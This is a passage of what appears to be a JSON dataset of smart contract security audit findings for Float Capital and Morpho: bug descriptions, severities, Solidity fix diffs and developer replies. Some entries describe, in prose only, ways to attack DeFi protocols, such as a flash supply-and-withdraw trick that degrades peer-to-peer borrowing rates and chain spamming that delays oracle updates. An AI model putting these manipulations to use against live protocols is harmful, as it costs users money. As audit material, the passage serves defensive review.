      "summary": "\nThis bug report is about an issue in the Float Capital Market smart contract related to unsafe type casting of `poolValue`. This issue was found by WATCHPUG and was reported on GitHub. \n\nWhen `poolValue` is a negative number due to loss in `valueChange` and `funding`, the unsafe type casting from `int256` to `uint256` will result in a huge number close to `2**255` which will revert `_rebalancePoolsAndExecuteBatchedActions()` due to overflow when multiplied by 1e18 at line 163. This can happen when the funding rate is 100% per year and the `EPOCH_LENGTH` is 4 days, as the funding fee for each epoch can be as much as ~1% on the effectiveValue.\n\nThe impact of this issue is that `_rebalancePoolsAndExecuteBatchedActions` will revert and cause the malfunction of the whole market. The code snippet related to this issue can be found at the following link: https://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L118-L185.\n\nThe recommended solution to this issue is to consider adding a new function to properly handle the bankruptcy of a specific pool. It was also discussed that a safe guard could be added to check that with both funding and value change, 99% is the maximum a pool can lose in any single iteration. It was also suggested to add checks to the epoch length on construction to ensure the smart contract is safe.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Float Capital",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/45",
      "tags": [
        "Type casting",
        "Signed/Unsigned"
      ],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "3508",
      "title": "H-1: An update gap in Chainlink's feed can malfunction the whole market",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/42 \n\n## Found by \nWATCHPUG\n\n## Summary\n\nThe `roundId` that is used for settling the price change and pushing the `latestExecutedEpochIndex` forward is strictly limited to be in a precise period of time. When there is no such `roundId`, the system will freeze and lock everyone out.\n\n## Vulnerability Detail\n\nThe check at L127 makes it impossible to use a roundId that was created at a later time than `relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH`.\n\nHowever, when the `EPOCH_LENGTH` is larger than the Chainlink feed's heartbeat length, or Chainlink failed to post a feed within the expected heartbeat for whatever reason, then it would be impossible to find a suitable roundId (as it does not exist) to push the epoch forward due to the rather strict limitation for the roundId.\n\n## Impact\n\nAs a result, the whole system will malfunction and no one can enter or exit the market.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L188-L195\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider allowing the `roundId` not to falls into the epoch, and use the previous roundId's price when that's the case:\n\n```diff\n    for (uint32 i = 0; i < lengthOfEpochsToExecute; i++) {\n      // Get correct data\n      (, int256 currentOraclePrice, uint256 currentOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(oracleRoundIdsToExecute[i]);\n\n      // Get Previous round data to validate correctness.\n-      (, , uint256 previousOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(oracleRoundIdsToExecute[i] - 1);\n+      (, int256 previousOraclePrice, uint256 previousOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(oracleRoundIdsToExecute[i] - 1);\n\n      // Check if there was a 'phase change' AND the `_currentOraclePrice` is zero.\n      if ((oracleRoundIdsToExecute[i] >> 64) > (latestExecutedOracleRoundId >> 64) && previousOracleUpdateTimestamp == 0) {\n        // NOTE: if the phase changes, then we want to correct the phase of the update.\n        //       There is no guarantee that the phaseID won't increase multiple times in a short period of time (hence the while loop).\n        //       But chainlink does promise that it will be sequential.\n        // View how phase changes happen here: https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.7/dev/AggregatorProxy.sol#L335\n        while (previousOracleUpdateTimestamp == 0) {\n          // NOTE: re-using this variable to keep gas costs low for this edge case.\n          latestExecutedOracleRoundId = (((latestExecutedOracleRoundId >> 64) + 1) << 64) | uint64(oracleRoundIdsToExecute[i] - 1);\n\n          (, , previousOracleUpdateTimestamp, , ) = chainlinkOracle.getRoundData(latestExecutedOracleRoundId);\n        }\n      }\n\n      // This checks the price given is valid and falls within the correct window.\n      // see https://app.excalidraw.com/l/2big5WYTyfh/4PhAp1a28s1\n      if (\n        previousOracleUpdateTimestamp >= relevantEpochStartTimestampWithMEWT ||\n        currentOracleUpdateTimestamp < relevantEpochStartTimestampWithMEWT\n-        currentOracleUpdateTimestamp >= relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH\n      ) revert InvalidOracleExecutionRoundId({oracleRoundId: oracleRoundIdsToExecute[i]});\n\n+      // If the new roundId does not falls into the epoch, use the prev roundId then\n+      if (currentOracleUpdateTimestamp >= relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH) {\n+        currentOraclePrice = previousOraclePrice;\n+      }\n\n      if (currentOraclePrice <= 0) revert InvalidOraclePrice({oraclePrice: currentOraclePrice});\n\n      missedEpochPriceUpdates[i] = currentOraclePrice;\n\n      relevantEpochStartTimestampWithMEWT += EPOCH_LENGTH;\n    }\n```\n\n## Discussion\n\n**JasoonS**\n\nThanks - we had a long internal debate discussion about this.\n\nWe decided that it is best to make the parameters (such as epoch length) long enough such that this is extremely unlikely to happen.\n\nWe have done some extensive latency and heartbeat analysis on chainlink oracles - as well as had an in-details discussion about how gas price spikes can cause delays to prices being pushed on chain (a side note - this is why a large mewt/minimumExecutionWatingTime is required - otherwise a gas price spike/griefing attack would be more feasible). I'll link some of that to this issue in a bit if that is interesting to you.\n\nAnyway - getting back to this issue - we believe it is better to leave the market paused if such an anomaly happens and give us time to analyse what happened. It is a sort of risk protection mechanism. Either we upgrade market for a fix (which will be under timelock), or we deprecate the market.\n\nI think our users will appreciate our prudence.\n\nOne thing to consider is that withdrawals also won't be processed in this edge case (maybe a good think?). I'll have another chat with the team on that.\n\nAgree that your solution is pretty benign too since there will just be no price change.\n\n**moose-code**\n\n@WooSungD would be useful if you could post that graph of chainlink prices on the analysis we did. \n\n**moose-code**\n\nFor more context, a few weeks ago we had detailed disscussion with the chainlink team, as you can't even rely on the hearbeat with certainty. \n\nE.g. the heartbeat of 27sec on polygon still showed outliers where we waited for up to 180 seconds in some cases for a new price because of big gas spikes. This is why we conducted the analysis so carefully, we want to make sure that we don't miss a chainlink price.\n\nHowever if we do miss a price, the auto deprecation means the system fails very gracefully, the markets are paused and everyone can simply withdraw after a cooldown period. \n\n**WooSungD**\n\nHere are some graphs showing the distribution of heartbeat (in seconds) for ETH-USD price feed on Chainlink Polygon.\n\n<img width=\"1641\" alt=\"image\" src=\"https://user-images.githubusercontent.com/88306711/202707461-cb8107d9-436f-44aa-af73-e9801c12aae3.png\">\n\n\n<img width=\"1654\" alt=\"image\" src=\"https://user-images.githubusercontent.com/88306711/202707525-b0dbb6d1-fd10-4aaa-bd93-b30dae6ef8cb.png\">\n\n\nThe outliers for the heartbeat mean that our MEWT needs to be longer (longer than max outlier necessarily) to prevent front-running.\n\nThe causes of outliers ito heartbeat were network congestion and gas spikes, according to the Chainlink team\n\n**moose-code**\n\nAfter chatting with the chainlink team more on this, the one potential attack vector (that seems unrealistic) that I can point out is spamming the polygon chain to the point where it delays the chainlink price update from being mined until the point where no valid price exists.\n\nThis would be extremely expensive and simply cause the market to deprecate (no financial gain). \n\n**Evert0x**\n\nWe still think this is a high severity issue as it can make the protocol malfunction",
      "summary": "\nThis bug report is about an update gap in Chainlink's feed which can malfunction the whole market. The check at L127 makes it impossible to use a roundId that was created at a later time than `relevantEpochStartTimestampWithMEWT + EPOCH_LENGTH`. When the `EPOCH_LENGTH` is larger than the Chainlink feed's heartbeat length, or Chainlink failed to post a feed within the expected heartbeat for whatever reason, then it would be impossible to find a suitable roundId (as it does not exist) to push the epoch forward due to the rather strict limitation for the roundId. As a result, the whole system will malfunction and no one can enter or exit the market.\n\nThe bug was found by WATCHPUG and the code snippet can be viewed at https://github.com/sherlock-audit/2022-11-float-capital/blob/main/contracts/market/template/MarketCore.sol#L188-L195. The tool used was Manual Review.\n\nThe recommendation was to consider allowing the `roundId` not to falls into the epoch, and use the previous roundId's price when that's the case. This was discussed further by team members, who decided that it is best to make the parameters (such as epoch length) long enough such that this is extremely unlikely to happen. They also found that withdrawals will not be processed in this edge case, which is a good thing. The team also noted that the attack vector of spamming the polygon chain to the point where it delays the chainlink price update from being mined until the point where no valid price exists is extremely expensive and simply cause the market to deprecate (no financial gain).\n\nDespite this, the team still considers this to be a high severity issue as it can make the protocol malfunction.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Float Capital",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-float-capital-judging/issues/42",
      "tags": [
        "Oracle",
        "Chainlink"
      ],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "6948",
      "title": "insertSorted inserts elements at wrong index",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nDoubleLinkedList.sol#L101\n\n## Description\nThe `insertSorted` function inserts elements after the last element has been inserted, when these should have actually been inserted before the last element. The sort order is therefore wrong, even if the maximum iterations count has not been reached. This is because of the check that the current element is not the tail.\n\n```solidity\nif ( ... && current != _list.tail) { insertBefore } else { insertAtEnd }\n```\n\n### Example\n- **Scenario 1**: \n  - `list = [20] .insert(40)` \n  - then `current == list.tail`, and is inserted at the back instead of the front.\n  - **Result**: `[20, 40]`\n  \n- **Scenario 2**: \n  - `list = [30, 10] ,insert(20)` \n  - insertion point should be before `current == 10`, but also `current == tail`.\n  - Therefore, the `current != _list.tail` condition is false and the element is wrongly inserted at the end.\n  - **Result**: `[30, 10, 20]`\n\n## Recommendation\nFix the algorithm (while still respecting FIFO, see #25). At some point, the while loop breaks and `current` points to some element. If `_list.accounts[current].value < _value`, it means `current` is a legitimate entry-point to insert before. Otherwise, we insert at the end.\n\n### Code Example\n```solidity\nfunction insertSorted(\n    List storage _list,\n    address _id,\n    uint256 _value,\n    uint256 _maxIterations\n) internal {\n    require(_list.accounts[_id].value == 0, \"DLL: account already created\");\n    \n    uint256 numberOfIterations;\n    address current = _list.head;\n    \n    while (\n        numberOfIterations <= _maxIterations &&\n        current != _list.tail &&\n        - _list.accounts[current].value > _value\n        + _list.accounts[current].value >= _value\n    ) {\n        current = _list.accounts[current].next;\n        numberOfIterations++;\n    }\n    \n    address nextId;\n    address prevId;\n    - if (numberOfIterations < _maxIterations && current != _list.tail) {\n    + if (_list.accounts[current].value < _value) {\n        prevId = _list.accounts[current].prev;\n        nextId = current;\n    } else prevId = _list.tail;\n    // ...\n}\n```\n\n## Morpho\nFixed in PR #526.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6947",
      "title": "insertSorted does not behave like a FIFO for same values",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n`DoubleLinkedList.sol#L93`\n\n## Description\nUsers that have the same value are inserted into the list before other users with the same value. It does not respect the \"seniority\" of the users' order and should behave more like a FIFO queue.\n\n## Recommendation\nConsider introducing the following change:\n\n```solidity\nwhile (\n    numberOfIterations <= _maxIterations &&\n    current != _list.tail &&\n    - _list.accounts[current].value > _value\n    + _list.accounts[current].value >= _value\n)\n```\n\n## Responses\n**Morpho:** Agree, it should behave like in FIFO style in this case, fixed in PR #526.  \n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6946",
      "title": "insertSorted iterates more than max iterations parameter",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context:** DoubleLinkedList.sol#L91\n\n**Description:** The `insertSorted` function iterates `_maxIterations + 1` times instead of `_maxIterations` times.\n\n**Recommendation:** Consider changing the code as follows:\n\n**Morpho:** Fixed in PR #526.\n\n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6945",
      "title": "DDL should prevent inserting items with 0 value",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n`DoubleLinkedList.sol#L83`\n\n## Description\nCurrently, the DDL library is only checking that the actual value (`_list.accounts[_id].value`) in the list associated with the `_id` is `0` to prevent inserting duplicates. The DDL library should also verify that the inserted value is greater than `0`. This check would prevent adding users with empty values, which may potentially cause the list to underperform and, as a result, negatively impact the overall protocol.\n\n## Recommendation\nAdd a `require` statement to prevent inserting empty values.\n\n```solidity\nfunction insertSorted(\n    List storage _list,\n    address _id,\n    uint256 _value,\n    uint256 _maxIterations\n) internal {\n    + require(_value != 0, \"DLL: _value must be != 0\");\n    require(_list.accounts[_id].value == 0, \"DLL: account already created\");\n    /// other code\n}\n```\n\nNote that `require` should be added as soon as possible to also prevent an `SLOAD` from the second `require`.\n\n## Morpho\nFixed in PR #526\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6944",
      "title": "Missing parameter validation on setters and event spamming prevention",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n\n- `RewardsManagerForAave.sol#L72-L79`\n- `MarketsManagerForAave.sol#L143-L151`\n- `MarketsManagerForAave.sol#L189-L196`\n- `MarketsManagerForAave.sol#L200-L202`\n- `MarketsManagerForAave.sol#L206-L208`\n- `PositionsManagerForAaveGettersSetters.sol#L33-L36`\n- `PositionsManagerForAaveGettersSetters.sol#L40-L43`\n- `PositionsManagerForAaveGettersSetters.sol#L47-L50`\n- `PositionsManagerForAaveGettersSetters.sol#L54-L57`\n- `PositionsManagerForAaveGettersSetters.sol#L61-L64`\n- `PositionsManagerForAaveGettersSetters.sol#L68-L72`\n\n## Description\n\nUser parameter validity should always be verified to prevent contract updates in an inconsistent state. The parameters value should also be different from the old one in order to prevent event spamming (emitting an event when not needed) and improve contract monitoring.\n\n### Example Code Changes\n\n**`contracts/aave/RewardsManagerForAave.sol`**\n\n```solidity\nfunction setAaveIncentivesController(address _aaveIncentivesController)\nexternal\noverride\nonlyOwner\n{\n    require(_aaveIncentivesController != address(0), \"param != address(0)\");\n    require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\");\n    aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController);\n    emit AaveIncentivesControllerSet(_aaveIncentivesController);\n}\n```\n\n**`contracts/aave/MarketsManagerForAave.sol`**\n\n```solidity\nfunction setReserveFactor(address _marketAddress, uint16 _newReserveFactor) external onlyOwner {\n    require(_marketAddress != address(0), \"param != address(0)\");\n    uint16 finalReserveFactor = HALF_MAX_BASIS_POINTS <= _newReserveFactor\n    ? HALF_MAX_BASIS_POINTS\n    : _newReserveFactor;\n\n    if (finalReserveFactor !== reserveFactor[_marketAddress]) {\n        reserveFactor[_marketAddress] = finalReserveFactor;\n        emit ReserveFactorSet(_marketAddress, finalReserveFactor);\n    }\n\n    updateRates(_marketAddress);\n}\n```\n\n```solidity\nfunction setNoP2P(address _marketAddress, bool _noP2P)\nexternal\nonlyOwner\nisMarketCreated(_marketAddress)\n{\n    require(_noP2P != noP2P[_marketAddress], \"param != prevValue\");\n    noP2P[_marketAddress] = _noP2P;\n    emit NoP2PSet(_marketAddress, _noP2P);\n}\n```\n\n```solidity\nfunction updateP2PExchangeRates(address _marketAddress)\nexternal\noverride\nonlyPositionsManager\nisMarketCreated(_marketAddress)\n{\n    _updateP2PExchangeRates(_marketAddress);\n}\n```\n\n```solidity\nfunction updateSPYs(address _marketAddress)\nexternal\noverride\nonlyPositionsManager\nisMarketCreated(_marketAddress)\n{\n    _updateSPYs(_marketAddress);\n}\n```\n\n**`contracts/aave/positions-manager-parts/PositionsManagerForAaveGettersSetters.sol`**\n\n```solidity\nfunction setAaveIncentivesController(address _aaveIncentivesController) external onlyOwner {\n    require(_aaveIncentivesController != address(0), \"param != address(0)\");\n    require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\");\n    aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController);\n    emit AaveIncentivesControllerSet(_aaveIncentivesController);\n}\n```\n\n## Important Notes\n\n- `_newNDS` min/max value should be accurately validated by the team because this will influence the maximum number of cycles that `DDL.insertSorted` can do. Setting a value too high would make the transaction fail, while setting it too low would make the `insertSorted` loop exit earlier, resulting in the user being added to the tail of the list. A more detailed issue about the NDS value can be found here: #33\n\n```solidity\nfunction setNDS(uint8 _newNDS) external onlyOwner {\n    // add a check on `_newNDS ` validating correctly max/min value of `_newNDS `\n    require(NDS != _newNDS, \"param != prevValue\");\n    NDS = _newNDS;\n    emit NDSSet(_newNDS);\n}\n```\n\n- `_newNDS` set to 0 would skip all the `MatchingEngineForAave` match/unmatch supplier/borrower functions if the user does not specify a custom `maxGas`. A more detailed issue about NDS value can be found here: #34\n\n```solidity\nfunction setMaxGas(MaxGas memory _maxGas) external onlyOwner {\n    // add a check on `_maxGas ` validating correctly max/min value of `_maxGas `\n    // add a check on `_maxGas ` internal value checking that at least one of them is different compared to the old version, !\n    maxGas = _maxGas;\n    emit MaxGasSet(_maxGas);\n}\n```\n\n```solidity\nfunction setTreasuryVault(address _newTreasuryVaultAddress) external onlyOwner {\n    require(_newTreasuryVaultAddress != address(0), \"param != address(0)\");\n    require(_newTreasuryVaultAddress != treasuryVault, \"param != prevValue\");\n    treasuryVault = _newTreasuryVaultAddress;\n    emit TreasuryVaultSet(_newTreasuryVaultAddress);\n}\n```\n\n```solidity\nfunction setRewardsManager(address _rewardsManagerAddress) external onlyOwner {\n    require(_rewardsManagerAddress != address(0), \"param != address(0)\");\n    require(_rewardsManagerAddress != rewardsManager, \"param != prevValue\");\n    rewardsManager = IRewardsManagerForAave(_rewardsManagerAddress);\n    emit RewardsManagerSet(_rewardsManagerAddress);\n}\n```\n\n- Important note: Should also check that `_poolTokenAddress` is currently handled by the `PositionsManagerForAave` and by the `MarketsManagerForAave`. Without this check, a pool token could start in a paused state.\n\n```solidity\nfunction setPauseStatus(address _poolTokenAddress) external onlyOwner {\n    require(_poolTokenAddress != address(0), \"param != address(0)\");\n    bool newPauseStatus = !paused[_poolTokenAddress];\n    paused[_poolTokenAddress] = newPauseStatus;\n    emit PauseStatusSet(_poolTokenAddress, newPauseStatus);\n}\n```\n\n## Recommendation\n\nFor each setter, add a validity check on user parameter and a check to prevent updating the state value with the same value and fire an event when its not needed.\n\n### Morpho\n\nAfter reflection, as all these functions will be triggered by governance, it might be overkill to implement all these checks. Although we will implement min and max value for `NDS` and for `maxGas` values.\n\n### Spearbit\n\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6943",
      "title": "Wrong liquidation value when withdrawn amount is non-zero",
      "impact": "LOW",
      "content": "## Report\n\n## Severity\nLow Risk\n\n## Context\nPositionsManagerForAaveLogic.sol#L438-L439\n\n## Situation\nWhen `_withdrawnAmount` is non-zero, the `liquidationValue` computation uses `assetData.liquidationValue` but should use `assetData.liquidationThreshold` instead.\n\n## Recommendation\nCurrently, this does not lead to any issues as `_withdrawnAmount` is always zero on liquidations, and all other calls to `_getUserHypotheticalBalanceStates` ignore this `liquidationValue`. We still recommend fixing this bug in case the return value is used in the future.\n\n```solidity\nliquidationValue -= Math.min(\n    liquidationValue,\n    - (_withdrawnAmount * assetData.underlyingPrice * assetData.liquidationValue) /\n    + (_withdrawnAmount * assetData.underlyingPrice * assetData.liquidationThreshold) /\n    (assetData.tokenUnit * MAX_BASIS_POINTS)\n);\n```\n\n## Morpho\nFixed in the PR #563 according to the recommendation.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6942",
      "title": "Possible unbounded loop over enteredMarkets array in _getUserHypotheticalBalanceStates",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity\nLow Risk\n\n## Context\nPositionsManagerForAaveLogic.sol#L416\n\n## Description\n`PositionsManagerForAaveLogic._getUserHypotheticalBalanceStates` is looping through `enteredMarkets`, which could be an unbounded array leading to a reverted transaction caused by a block gas limit. While it is true that Morpho will probably handle a subset of assets controlled by Aave, this loop could still revert because of gas limits for a variety of reasons:\n\n- In the future, Aave could have more assets, and Morpho could match 1:1 those assets.\n- Block gas size could decrease.\n- Opcodes could cost more gas.\n\n## Recommendation\nImplement a mechanism that removes `_poolTokenAddress` from the market array to reduce array size if the user does not have more tokens in that specific market.\n\n## Morpho\nFixed in PR #560 by possibly exiting the market on withdraw/repay.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6941",
      "title": "_repayERC20ToPool is approving the wrong amount",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nPositionsManagerForAaveLogic.sol#L502-L510\n\n## Description\n`_repayERC20ToPool` is approving the amount of underlying token specified via the input parameter `_amount` when the correct amount that should be approved is the one calculated via:\n\n```solidity\n_amount = Math.min(\n    _amount,\n    variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt)\n);\n```\n\n## Recommendation\nApprove the correct amount of underlying token. A possible solution may be as depicted below:\n\n```solidity\n_underlyingToken.safeApprove(address(lendingPool), _amount);\nIVariableDebtToken variableDebtToken = IVariableDebtToken(\n    lendingPool.getReserveData(address(_underlyingToken)).variableDebtTokenAddress\n);\n// Do not repay more than the contract's debt on Aave\n_amount = Math.min(\n    _amount,\n    variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt)\n);\n_underlyingToken.safeApprove(address(lendingPool), _amount);\n```\n\nAdditionally, `variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt)` could be replaced by `variableDebtToken.balanceOf(address(this))` to save gas given how `balanceOf` is implemented on the Aave contract. In this case, the `uint256 _normalizedVariableDebt` function parameter should be removed.\n\n## Morpho\nFixes have been implemented in the PR #536\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6940",
      "title": "Event Withdrawn is emitted using the wrong amounts of supplyBalanceInOf",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nPositionsManagerForAaveLogic.sol#L252-L258\n\n## Description\nInside the `_withdraw` function, all changes performed to `supplyBalanceInOf` are done using the `_supplier` address. The `_receiver` is correctly used only to transfer the underlying token via `underlyingToken.safeTransfer(_receiver, _amount);`. The `Withdrawn` event should be emitted passing the `supplyBalanceInOf[_poolTokenAddress]` of the supplier and not the receiver. This problem will arise when this internal function is called by `PositionsManagerForAave.liquidate` where supplier (borrower in this case) and receiver (liquidator) would not be the same address.\n\n## Recommendation\nUse the supplier address to access `supplyBalanceInOf` when emitting the `Withdrawn` event.\n```solidity\nemit Withdrawn(\n    _supplier,\n    _poolTokenAddress,\n    _amount,\n    - supplyBalanceInOf[_poolTokenAddress][_receiver].onPool,\n    - supplyBalanceInOf[_poolTokenAddress][_receiver].inP2P,\n    + supplyBalanceInOf[_poolTokenAddress][_supplier].onPool,\n    + supplyBalanceInOf[_poolTokenAddress][_supplier].inP2P\n);\n```\n\n## Morpho\nFixed in the PR #556, event has been moved to the entrypoint contract and uses `msg.sender` as the index which is the supplier.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6939",
      "title": "User withdrawals can fail if Morpho position is close to liquidation",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`PositionsManagerForAaveLogic.sol#L246`\n\n## Description\nWhen trying to withdraw funds from Morpho as a P2P supplier, the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If Morphos position on Aaves debt/collateral value is higher than the markets maximum LTV (Loan-To-Value) ratio but lower than the markets liquidation threshold, the borrow will fail, and the position cannot be liquidated. Therefore, withdrawals could fail.\n\n## Recommendation\nThis seems hard to solve in the current system as it relies on \"hard withdraws\" to always ensure enough liquidity for P2P suppliers. Consider ways to mitigate the impact of this problem. \n\n## Morpho\nSince Morpho will first launch on Compound (where there is only Collateral Factor), we will not focus now on this particular issue.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a problem with a withdrawal algorithm in PositionsManagerForAaveLogic.sol. When trying to withdraw funds from Morpho as a P2P supplier, the last step of the algorithm borrows an amount from the pool (\"hard withdraw\"). If Morphos position on Aaves debt / collateral value is higher than the markets maximum LTV ratio but lower than the markets liquidation threshold, the borrow will fail and the position cannot be liquidated. In this case, withdrawals may fail. \n\nThe recommendation is to consider ways to mitigate the impact of this problem. Morpho will first launch on Compound (where there is only Collateral Factor) and will not focus now on this particular issue. Spearbit has acknowledged the report. \n\nIn summary, this bug report is about a problem with a withdrawal algorithm in PositionsManagerForAaveLogic.sol that can lead to failed withdrawals if Morphos position on Aaves debt / collateral value is higher than the markets maximum LTV ratio but lower than the markets liquidation threshold. The recommendation is to consider ways to mitigate the impact of this problem, although Morpho will not focus on this issue at the moment.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "6938",
      "title": "P2P borrowers rate can be reduced",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context \n`MarketsManagerForAave.sol#L448`\n\n## Situation \nUsers on the pool currently earn an inferior rate compared to users with P2P credit lines. There is a queue for being connected P2P. Since this queue cannot be fully processed in a single transaction, the protocol introduces the concept of a maximum iteration count and a borrower/supplier \"delta\" (c.f. yellow paper). This delta leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced which leads to worse rates.\n\n**Example:** Imagine some borrowers are matched P2P (earning a low borrow rate), while many are still in the pool and therefore in the pool queue (earning a worse borrow rate from Aave).\n\n- An attacker supplies a huge amount, creating a P2P credit line for every borrower (they can repeat this step several times if the max iterations limit is reached).\n- The attacker immediately withdraws the supplied amount. The protocol then attempts to demote the borrowers and reconnect them to the pool. However, the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. These are funds borrowed from the pool (at a higher borrow rate) that are still wrongly recorded as being in a P2P position for some borrowers. This increase in the borrow rate is socialized equally among all P2P borrowers (reflected in an updated `p2pBorrowRate` as the `shareOfDelta` increased).\n- As a result, the initial P2P borrowers earn a worse rate than before. If the borrower delta is large, it is close to the on-pool rate.\n- If an attacker-controlled borrower account was newly matched P2P and not properly reconnected to the pool (in the \"demote borrowers\" step of the algorithm), they will earn the better P2P rate compared to the on-pool rate they earned before.\n\n## Recommendation \nConsider mitigations for single-transaction flash supply & withdraw attacks.\n\n## Morpho \nWe may need to refactor the entire queue system at some point.\n\n## Spearbit \nAcknowledged.",
